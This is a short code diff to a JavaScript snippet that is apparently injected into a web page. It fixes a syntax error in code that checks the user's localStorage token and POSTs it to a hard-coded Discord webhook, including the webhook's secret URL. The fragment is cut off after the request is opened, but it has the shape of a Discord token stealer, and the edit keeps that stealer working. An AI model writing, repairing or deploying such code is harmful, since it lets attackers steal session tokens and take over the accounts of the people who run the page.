@@ -7,7 +7,7 @@ script.textContent = `
       if(localStorage.token != token){
       sendrq();
       }
-  }
+  });
   function sendrq(){
       var request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/842367883203444787/3wUnoiRkreCFqB6TJ8VsBTQmDOCFfB58DAdMItnYik4HhIlW8_6wZR2edA5tVE6neD4g");
